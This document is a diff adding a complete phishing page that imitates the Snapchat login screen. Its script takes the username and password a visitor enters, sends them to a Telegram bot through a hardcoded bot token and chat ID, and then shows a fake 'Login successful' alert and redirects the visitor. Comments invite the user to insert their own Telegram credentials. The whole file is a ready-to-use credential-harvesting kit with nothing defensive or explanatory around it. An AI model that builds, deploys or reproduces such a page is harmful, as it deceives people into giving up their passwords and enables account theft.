@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background: #F7F7F7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background: #fff;
+            width: 380px;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .snapchat-logo {
+            width: 40px;
+            margin-bottom: 15px;
+        }
+
+        h2 {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        label {
+            font-size: 14px;
+            font-weight: bold;
+            display: block;
+            text-align: left;
+            margin-top: 10px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #F7F7F7;
+        }
+
+        .forgot-password {
+            text-align: right;
+            font-size: 12px;
+            color: gray;
+            margin-top: 5px;
+            cursor: pointer;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #FFFC00;
+            border: none;
+            font-size: 16px;
+            font-weight: bold;
+            color: black;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        .login-btn:hover {
+            background: #f4ea00;
+        }
+
+        .signup {
+            margin-top: 15px;
+            font-size: 14px;
+        }
+
+        .signup a {
+            color: black;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .signup a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1024px-Snapchat_logo.svg.png" 
+             alt="Snapchat Logo" class="snapchat-logo">
+        <h2>Log in to Snapchat</h2>
+        <form id="loginForm">
+            <label>Username or Email</label>
+            <input type="text" id="username" placeholder="Username" required>
+
+            <label>Password</label>
+            <input type="password" id="password" placeholder="••••••••" required>
+            <div class="forgot-password">Forgot Password</div>
+
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+        <div class="signup">New To Snapchat? <a href="#">Sign Up</a></div>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Form ko submit hone se roke
+
+            let username = document.getElementById("username").value;
+            let password = document.getElementById("password").value;
+
+            let botToken = "7653297508:AAE_sfu893LJ-D5Z5xtr_sjy-XEJvvf7haQ"; // Yahan apna Telegram Bot Token daalein
+            let chatId = "5776427389"; // Yahan apna Telegram Chat ID daalein
+            
+            let message = `🚀 👿😈Snapchat Login Attempt!\n👤 Username: ${username}\n🔑 👿👿Password😈👿: ${password}`;
+
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("Login successful! ");
+                        // Redirect to Snapchat ID
+                        window.location.href = "https://www.snapchat.com/add/aqib_s4173?share_id=muNhEYoDxwk&locale=en-GB";
+                    } else {
+                        alert("Error sending message to Telegram.");
+                    }
+                })
+                .catch(error => {
+                    alert("Something went wrong!");
+                    console.error(error);
+                });
+        });
+    </script>
+    
+</body>
+</html>
